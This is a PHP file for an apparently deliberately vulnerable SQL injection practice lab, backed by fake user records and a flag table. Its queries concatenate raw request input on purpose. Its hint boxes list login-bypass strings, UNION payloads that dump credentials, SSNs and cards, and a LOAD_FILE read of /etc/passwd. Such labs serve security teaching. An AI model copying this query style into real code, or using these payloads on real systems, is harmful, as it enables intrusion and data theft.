<?php
// ============================================================
// 🚀 SQL INJECTION ULTIMATE LAB - PURE & SIMPLE
// ============================================================
// Copy, paste, run. That's it. Auto works.
// ============================================================

error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

// --- DB Setup ---
$conn = @mysqli_connect('127.0.0.1', 'root', '');
if (!$conn) die("MySQL connection failed! Start XAMPP/WAMP MySQL service.");

mysqli_query($conn, "CREATE DATABASE IF NOT EXISTS sqli_lab");
mysqli_select_db($conn, 'sqli_lab');

// --- Auto create tables ---
mysqli_query($conn, "CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100),
    password VARCHAR(100),
    email VARCHAR(200),
    role VARCHAR(20) DEFAULT 'user',
    ssn VARCHAR(20),
    credit_card VARCHAR(20),
    phone VARCHAR(20),
    address TEXT
)");

mysqli_query($conn, "CREATE TABLE IF NOT EXISTS products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(200),
    price DECIMAL(10,2),
    category VARCHAR(100)
)");

mysqli_query($conn, "CREATE TABLE IF NOT EXISTS secrets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    secret_key VARCHAR(200),
    secret_value TEXT
)");

// --- Insert data (once) ---
$check = mysqli_query($conn, "SELECT COUNT(*) as c FROM users");
$d = mysqli_fetch_assoc($check);
if ($d['c'] == 0) {
    mysqli_query($conn, "INSERT INTO users VALUES
        (1, 'admin', MD5('admin123'), 'admin@lab.com', 'admin', '123-45-6789', '4111-1111-1111-1111', '+1-555-0001', '1 Admin St'),
        (2, 'john', MD5('password123'), 'john@test.com', 'user', '234-56-7890', '4222-2222-2222-2222', '+1-555-0002', '2 Main St'),
        (3, 'jane', MD5('jane2024'), 'jane@test.com', 'user', '345-67-8901', '4333-3333-3333-3333', '+1-555-0003', '3 Oak Ave'),
        (4, 'vip_user', MD5('vip@2024'), 'vip@lab.com', 'vip', '456-78-9012', '4444-4444-4444-4444', '+1-555-0004', '4 VIP Ln'),
        (5, 'superadmin', MD5('superSecret!@#'), 'super@admin.com', 'admin', '567-89-0123', '4555-5555-5555-5555', '+1-555-0005', '5 Secure Blvd')
    ");

    mysqli_query($conn, "INSERT INTO products VALUES
        (1, 'Laptop', 999.99, 'Electronics'),
        (2, 'Phone', 699.99, 'Electronics'),
        (3, 'Shirt', 29.99, 'Clothing'),
        (4, 'Shoes', 89.99, 'Clothing'),
        (5, 'Book', 19.99, 'Books')
    ");

    mysqli_query($conn, "INSERT INTO secrets VALUES
        (1, 'FLAG', 'HTB{SQL_1nj3ct10n_Pr0_2024}'),
        (2, 'DB_PASSWORD', 'RootPass!@#SuperSecret'),
        (3, 'ENCRYPTION_KEY', 'AES-256-9F8E7D6C5B4A3F2E'),
        (4, 'ADMIN_EMAIL', 'admin@secret-mail.com'),
        (5, 'API_KEY', 'sk_live_8x7w6v5u4t3s2r1q0p9o8i')
    ");
}

// === HANDLE REQUESTS ===
$last_query = '';
$output = '';

// LOGIN - Error Based + Union
if (isset($_POST['login'])) {
    $u = $_POST['username'];
    $p = $_POST['password'];
    $sql = "SELECT * FROM users WHERE username='$u' AND password=MD5('$p')";
    $last_query = $sql;
    $res = @mysqli_query($conn, $sql);
    if ($res && mysqli_num_rows($res) > 0) {
        $user = mysqli_fetch_assoc($res);
        $_SESSION['logged'] = true;
        $_SESSION['uid'] = $user['id'];
        $_SESSION['uname'] = $user['username'];
        $_SESSION['role'] = $user['role'];
        $output = "<div class='ok'>✅ Welcome {$user['username']} (Role: {$user['role']})</div>";
    } else {
        $err = mysqli_error($conn);
        $output = "<div class='err'>❌ Failed!<br>SQL: " . htmlspecialchars($sql) . "<br>Error: $err</div>";
    }
}

// SEARCH - UNION Based
if (isset($_GET['search'])) {
    $field = $_GET['field'] ?? 'username';
    $q = $_GET['q'] ?? '';
    $limit = $_GET['limit'] ?? 10;
    $sql = "SELECT * FROM users WHERE $field LIKE '%$q%' LIMIT $limit";
    $last_query = $sql;
}

// SQL RUNNER - Direct
if (isset($_GET['sql'])) {
    $sql = $_GET['sql'];
    $last_query = $sql;
}

// DELETE
if (isset($_GET['del'])) {
    $id = $_GET['del'];
    $sql = "DELETE FROM users WHERE id=$id";
    $last_query = $sql;
    @mysqli_query($conn, $sql);
    $output = "<div class='ok'>✅ User $id deleted!</div>";
}

// LOGOUT
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>SQL Injection Lab</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:system-ui,-apple-system,sans-serif; background:#0d1117; color:#e0e0e0; min-height:100vh; }
        .top { background:#161b22; border-bottom:3px solid #00ff88; padding:18px 30px; display:flex; justify-content:space-between; align-items:center; }
        .top h1 { color:#00ff88; font-size:22px; }
        .top h1 span { color:#ff4444; }
        .nav a { color:#8b949e; text-decoration:none; padding:8px 14px; border-radius:6px; font-size:13px; display:inline-block; }
        .nav a:hover { color:#00ff88; background:rgba(0,255,136,0.1); }
        .cont { max-width:1300px; margin:20px auto; padding:0 20px; }
        .card { background:#161b22; border:1px solid #30363d; border-radius:10px; padding:24px; margin-bottom:18px; }
        .card h2 { color:#00ff88; font-size:17px; margin-bottom:14px; padding-bottom:8px; border-bottom:1px solid #30363d; }
        .card h2.red { color:#ff4444; }
        .card h3 { color:#58a6ff; font-size:14px; margin:10px 0; }
        .qbox { background:#0d1117; border-left:4px solid #58a6ff; padding:12px 16px; font-family:monospace; font-size:12px; margin:8px 0; color:#58a6ff; word-break:break-all; }
        .ok { color:#00ff88; background:rgba(0,255,136,0.1); border:1px solid #00ff8844; padding:12px; border-radius:6px; margin:8px 0; font-size:13px; }
        .err { color:#ff4444; background:rgba(255,68,68,0.1); border:1px solid #ff444444; padding:12px; border-radius:6px; margin:8px 0; font-size:13px; }
        input, select, textarea { width:100%; padding:10px 14px; margin:5px 0 10px 0; background:#0d1117; border:1px solid #30363d; border-radius:6px; color:#e0e0e0; font-size:14px; }
        input:focus { outline:none; border-color:#00ff88; }
        button, .btn { background:linear-gradient(135deg,#00ff88,#00cc6a); color:#0a0e17; padding:10px 22px; border:none; border-radius:6px; cursor:pointer; font-weight:700; font-size:13px; transition:all .2s; }
        button:hover { transform:translateY(-2px); box-shadow:0 5px 20px rgba(0,255,136,0.3); }
        .btn-red { background:linear-gradient(135deg,#ff4444,#cc0000); color:white; }
        table { width:100%; border-collapse:collapse; margin:10px 0; font-size:13px; }
        th { background:#21262d; color:#00ff88; padding:10px 12px; text-align:left; border:1px solid #30363d; font-size:11px; text-transform:uppercase; }
        td { padding:8px 12px; border:1px solid #30363d; }
        tr:hover { background:#1c2128; }
        .g2 { display:grid; grid-template-columns:1fr 1fr; gap:18px; }
        .g3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:18px; }
        .g4 { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:14px; }
        @media (max-width:768px) { .g2,.g3 { grid-template-columns:1fr; } }
        .st { background:#0d1117; border:1px solid #30363d; border-radius:8px; padding:14px; text-align:center; }
        .st .n { font-size:24px; font-weight:800; color:#00ff88; }
        .st .l { color:#8b949e; font-size:11px; text-transform:uppercase; margin-top:3px; }
        .badge { display:inline-block; padding:2px 10px; border-radius:10px; font-size:11px; font-weight:700; }
        .badge-admin { background:#ff4444; color:white; }
        .badge-user { background:#58a6ff; color:white; }
        .badge-vip { background:#ffaa00; color:#0a0e17; }
        .hint { background:#0d1117; border:1px solid #30363d; border-radius:6px; padding:14px; margin-top:12px; font-size:12px; }
        .hint code { color:#ffaa00; background:#1c2128; padding:2px 6px; border-radius:3px; font-size:12px; }
        .hint strong { color:#00ff88; }
        .login-box { max-width:420px; margin:80px auto; }
        .ft { text-align:center; padding:18px; color:#8b949e; font-size:12px; border-top:1px solid #30363d; margin-top:30px; }
        pre { background:#0d1117; padding:14px; border-radius:6px; overflow-x:auto; max-height:500px; font-size:12px; border:1px solid #30363d; }
    </style>
</head>
<body>

<div class="top">
    <h1>⚡ SQL <span>Injection</span> Lab</h1>
    <div class="nav">
        <?php if (isset($_SESSION['logged'])): ?>
            <a href="<?php echo $_SERVER['PHP_SELF']; ?>">Home</a>
            <a href="<?php echo $_SERVER['PHP_SELF']; ?>?page=users">Users</a>
            <a href="<?php echo $_SERVER['PHP_SELF']; ?>?page=products">Products</a>
            <a href="<?php echo $_SERVER['PHP_SELF']; ?>?page=search">🔍 Search</a>
            <a href="<?php echo $_SERVER['PHP_SELF']; ?>?page=secrets">🔴 Secrets</a>
            <a href="<?php echo $_SERVER['PHP_SELF']; ?>?page=sql">⚡ SQL</a>
            <a href="<?php echo $_SERVER['PHP_SELF']; ?>?logout=1" style="color:#ff4444;">Logout [<?php echo $_SESSION['uname']; ?>]</a>
        <?php else: ?>
            <a href="<?php echo $_SERVER['PHP_SELF']; ?>">Home</a>
        <?php endif; ?>
    </div>
</div>

<div class="cont">

<?php
if ($last_query) echo "<div class='qbox'>🔍 SQL: " . htmlspecialchars($last_query) . "</div>";
echo $output;

// ==================== LOGIN PAGE ====================
if (!isset($_SESSION['logged'])):
?>
<div class="login-box">
    <div class="card">
        <h2>🔐 Login</h2>
        <form method="POST">
            <label>Username</label>
            <input type="text" name="username" autofocus autocomplete="off">
            <label>Password</label>
            <input type="password" name="password">
            <button type="submit" name="login" style="width:100%;margin-top:5px;">Login</button>
        </form>
        <div class="hint">
            <strong>💡 Try:</strong><br>
            <code>admin' OR '1'='1</code> / anything<br>
            <code>admin' OR '1'='1' -- -</code><br>
            <code>' OR 1=1 -- -</code><br><br>
            <strong>Or use real creds:</strong> john / password123
        </div>
    </div>
</div>

<?php
else:
$page = $_GET['page'] ?? 'home';
$uid = $_SESSION['uid'];

// ==================== HOME ====================
if ($page == 'home'):
    $s = mysqli_fetch_assoc(mysqli_query($conn, "SELECT COUNT(*) as uc FROM users"));
    $p = mysqli_fetch_assoc(mysqli_query($conn, "SELECT COUNT(*) as pc FROM products"));
    $sc = mysqli_fetch_assoc(mysqli_query($conn, "SELECT COUNT(*) as sc FROM secrets"));
?>
<div class="g4">
    <div class="st"><div class="n"><?php echo $s['uc']; ?></div><div class="l">Users</div></div>
    <div class="st"><div class="n"><?php echo $p['pc']; ?></div><div class="l">Products</div></div>
    <div class="st"><div class="n"><?php echo $sc['sc']; ?></div><div class="l">Secrets</div></div>
    <div class="st"><div class="n" style="color:<?php echo $_SESSION['role']=='admin'?'#ff4444':'#58a6ff';?>"><?php echo $_SESSION['role']; ?></div><div class="l">Your Role</div></div>
</div>

<div class="g2">
    <div class="card">
        <h2>👤 Users</h2>
        <?php
        $res = mysqli_query($conn, "SELECT id,username,email,role,ssn,credit_card,phone FROM users");
        if ($res && mysqli_num_rows($res)>0): ?>
        <table>
            <tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th><th>SSN</th><th>Card</th><th>Phone</th></tr>
            <?php while ($r = mysqli_fetch_assoc($res)): ?>
            <tr>
                <td><?php echo $r['id']; ?></td>
                <td><?php echo $r['username']; ?></td>
                <td><?php echo $r['email']; ?></td>
                <td><span class="badge badge-<?php echo $r['role']; ?>"><?php echo $r['role']; ?></span></td>
                <td><?php echo $r['ssn']; ?></td>
                <td><?php echo $r['credit_card']; ?></td>
                <td><?php echo $r['phone']; ?></td>
            </tr>
            <?php endwhile; ?>
        </table>
        <?php endif; ?>
    </div>
    <div class="card">
        <h2>📦 Products</h2>
        <?php
        $res = mysqli_query($conn, "SELECT * FROM products");
        if ($res && mysqli_num_rows($res)>0): ?>
        <table>
            <tr><th>ID</th><th>Name</th><th>Price</th><th>Category</th></tr>
            <?php while ($r = mysqli_fetch_assoc($res)): ?>
            <tr><td><?php echo $r['id']; ?></td><td><?php echo $r['name']; ?></td><td>$<?php echo $r['price']; ?></td><td><?php echo $r['category']; ?></td></tr>
            <?php endwhile; ?>
        </table>
        <?php endif; ?>
    </div>
</div>
<div class="card">
    <h2 class="red">🔴 Secrets (FLAG here!)</h2>
    <?php
    $res = mysqli_query($conn, "SELECT * FROM secrets");
    if ($res && mysqli_num_rows($res)>0): ?>
    <table>
        <tr><th>ID</th><th>Key</th><th>Value</th></tr>
        <?php while ($r = mysqli_fetch_assoc($res)): ?>
        <tr><td><?php echo $r['id']; ?></td><td><?php echo $r['secret_key']; ?></td><td style="color:#ffaa00;font-weight:700;"><?php echo $r['secret_value']; ?></td></tr>
        <?php endwhile; ?>
    </table>
    <?php endif; ?>
</div>

<?php
// ==================== USERS ====================
elseif ($page == 'users'):
?>
<div class="card">
    <h2>👥 All Users</h2>
    <?php
    $res = mysqli_query($conn, "SELECT * FROM users");
    if ($res && mysqli_num_rows($res)>0): ?>
    <table>
        <tr><th>ID</th><th>Username</th><th>Password (MD5)</th><th>Email</th><th>Role</th><th>SSN</th><th>Credit Card</th><th>Phone</th><th>Address</th><th>Action</th></tr>
        <?php while ($r = mysqli_fetch_assoc($res)): ?>
        <tr>
            <td><?php echo $r['id']; ?></td>
            <td><?php echo $r['username']; ?></td>
            <td style="font-family:monospace;font-size:11px;"><?php echo $r['password']; ?></td>
            <td><?php echo $r['email']; ?></td>
            <td><span class="badge badge-<?php echo $r['role']; ?>"><?php echo $r['role']; ?></span></td>
            <td><?php echo $r['ssn']; ?></td>
            <td><?php echo $r['credit_card']; ?></td>
            <td><?php echo $r['phone']; ?></td>
            <td><?php echo $r['address']; ?></td>
            <td><a href="<?php echo $_SERVER['PHP_SELF']; ?>?del=<?php echo $r['id']; ?>" class="btn btn-red" style="padding:3px 10px;font-size:11px;text-decoration:none;" onclick="return confirm('Delete user <?php echo $r['username']; ?>?')">Del</a></td>
        </tr>
        <?php endwhile; ?>
    </table>
    <?php endif; ?>
</div>

<?php
// ==================== PRODUCTS ====================
elseif ($page == 'products'):
?>
<div class="card">
    <h2>📦 Products</h2>
    <form method="GET">
        <input type="hidden" name="page" value="products">
        <div class="g3">
            <div><label>Category</label>
            <select name="cat">
                <option value="">All</option>
                <option value="Electronics">Electronics</option>
                <option value="Clothing">Clothing</option>
                <option value="Books">Books</option>
            </select></div>
            <div><label>Price Min</label><input type="text" name="min" placeholder="0" value="<?php echo $_GET['min']??''; ?>"></div>
            <div><label>Price Max</label><input type="text" name="max" placeholder="9999" value="<?php echo $_GET['max']??''; ?>"></div>
        </div>
        <button type="submit">Filter</button>
    </form>
    <?php
    $where = "1=1";
    if (!empty($_GET['cat'])) $where .= " AND category='{$_GET['cat']}'";
    if (!empty($_GET['min'])) $where .= " AND price >= {$_GET['min']}";
    if (!empty($_GET['max'])) $where .= " AND price <= {$_GET['max']}";
    
    $sql = "SELECT * FROM products WHERE $where";
    $last_query = $sql;
    $res = @mysqli_query($conn, $sql);
    
    if ($res && mysqli_num_rows($res)>0): ?>
    <table>
        <tr><th>ID</th><th>Name</th><th>Price</th><th>Category</th></tr>
        <?php while ($r = mysqli_fetch_assoc($res)): ?>
        <tr><td><?php echo $r['id']; ?></td><td><?php echo $r['name']; ?></td><td>$<?php echo $r['price']; ?></td><td><?php echo $r['category']; ?></td></tr>
        <?php endwhile; ?>
    </table>
    <?php endif; ?>
    <div class="hint">
        Try: <code>cat=Electronics&min=' UNION SELECT 1,2,3,4 -- -</code>
    </div>
</div>

<?php
// ==================== SEARCH ====================
elseif ($page == 'search'):
?>
<div class="card">
    <h2>🔍 Search Users</h2>
    <form method="GET">
        <input type="hidden" name="search" value="1">
        <div class="g3">
            <div><label>Field</label>
            <select name="field">
                <option value="username">Username</option>
                <option value="email">Email</option>
                <option value="ssn">SSN</option>
                <option value="credit_card">Credit Card</option>
                <option value="role">Role</option>
                <option value="password">Password</option>
            </select></div>
            <div><label>Search</label><input type="text" name="q" value="<?php echo $_GET['q']??''; ?>"></div>
            <div><label>Limit</label><input type="text" name="limit" value="<?php echo $_GET['limit']??'10'; ?>"></div>
        </div>
        <button type="submit">🔍 Search</button>
    </form>
    <?php
    if (isset($_GET['search'])) {
        $field = $_GET['field']??'username';
        $q = $_GET['q']??'';
        $limit = $_GET['limit']??10;
        $sql = "SELECT id,username,email,role,ssn,credit_card FROM users WHERE $field LIKE '%$q%' LIMIT $limit";
        $last_query = $sql;
        $res = @mysqli_query($conn, $sql);
        
        if ($res && mysqli_num_rows($res)>0): ?>
        <table>
            <tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th><th>SSN</th><th>Card</th></tr>
            <?php while ($r = mysqli_fetch_assoc($res)): ?>
            <tr><td><?php echo $r['id']; ?></td><td><?php echo $r['username']; ?></td><td><?php echo $r['email']; ?></td><td><span class="badge badge-<?php echo $r['role']; ?>"><?php echo $r['role']; ?></span></td><td><?php echo $r['ssn']; ?></td><td><?php echo $r['credit_card']; ?></td></tr>
            <?php endwhile; ?>
        </table>
        <?php else: ?>
        <p style="color:#8b949e;">No results. Error: <?php echo mysqli_error($conn)?:'None'; ?></p>
        <?php endif;
    } ?>
    <div class="hint">
        <strong>🔥 UNION Payloads:</strong><br>
        <code>q=' UNION SELECT 1,@@version,user(),database(),5,6 -- -</code><br>
        <code>q=' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4,5,6 FROM information_schema.TABLES -- -</code><br>
        <code>q=' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,4,5,6 FROM information_schema.COLUMNS WHERE TABLE_NAME='users' -- -</code><br>
        <code>q=' UNION SELECT 1,group_concat(username),group_concat(password),group_concat(ssn),group_concat(credit_card),6 FROM users -- -</code><br>
        <code>q=' UNION SELECT 1,secret_key,secret_value,4,5,6 FROM secrets -- -</code> ← FLAG!
    </div>
</div>

<?php
// ==================== SECRETS ====================
elseif ($page == 'secrets'):
?>
<div class="card">
    <h2 class="red">🔴 Secret Vault</h2>
    <?php
    $res = mysqli_query($conn, "SELECT * FROM secrets");
    if ($res && mysqli_num_rows($res)>0): ?>
    <table>
        <tr><th>ID</th><th>Secret Key</th><th>Secret Value</th></tr>
        <?php while ($r = mysqli_fetch_assoc($res)): ?>
        <tr><td><?php echo $r['id']; ?></td><td><?php echo $r['secret_key']; ?></td><td style="color:#ffaa00;font-weight:700;font-size:16px;">🏴 <?php echo $r['secret_value']; ?></td></tr>
        <?php endwhile; ?>
    </table>
    <?php endif; ?>
</div>

<?php
// ==================== SQL RUNNER ====================
elseif ($page == 'sql'):
?>
<div class="card">
    <h2>⚡ SQL Command Runner</h2>
    <form method="GET">
        <input type="hidden" name="sql" value="1">
        <textarea name="sql" rows="4" style="font-family:'Courier New',monospace;width:100%;font-size:13px;background:#0d1117;color:#58a6ff;border:1px solid #30363d;padding:12px;border-radius:6px;" placeholder="SELECT * FROM users"><?php echo htmlspecialchars($_GET['sql']??'SELECT * FROM users'); ?></textarea>
        <button type="submit" style="margin-top:8px;">▶ Run</button>
    </form>
    <?php
    if (isset($_GET['sql'])) {
        $sql = $_GET['sql'];
        $last_query = $sql;
        $res = @mysqli_query($conn, $sql);
        
        if ($res === false) {
            echo "<div class='err'>❌ " . mysqli_error($conn) . "</div>";
        } elseif ($res === true) {
            echo "<div class='ok'>✅ Query OK. Affected: " . mysqli_affected_rows($conn) . "</div>";
        } else {
            echo "<div class='ok'>✅ Returned " . mysqli_num_rows($res) . " rows</div>";
            $fields = mysqli_fetch_fields($res);
            echo "<table><tr>";
            foreach ($fields as $f) echo "<th>" . $f->name . "</th>";
            echo "</tr>";
            while ($row = mysqli_fetch_assoc($res)) {
                echo "<tr>";
                foreach ($row as $v) echo "<td>" . htmlspecialchars(substr($v??'',0,200)) . "</td>";
                echo "</tr>";
            }
            echo "</table>";
        }
    }
    ?>
    <div class="hint">
        <strong>🔥 Try:</strong><br>
        <code>SELECT * FROM secrets</code> - Get FLAG<br>
        <code>SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()</code><br>
        <code>SELECT user(),@@version,database()</code><br>
        <code>SELECT LOAD_FILE('/etc/passwd')</code><br>
        <code>SHOW DATABASES</code>
    </div>
</div>

<?php
    endif; // page
endif; // logged in
?>

</div><!-- cont -->

<div class="ft">
    🔥 SQL Injection Lab • Authorized Pentest Only • DB: sqli_lab
</div>

</body>
</html>
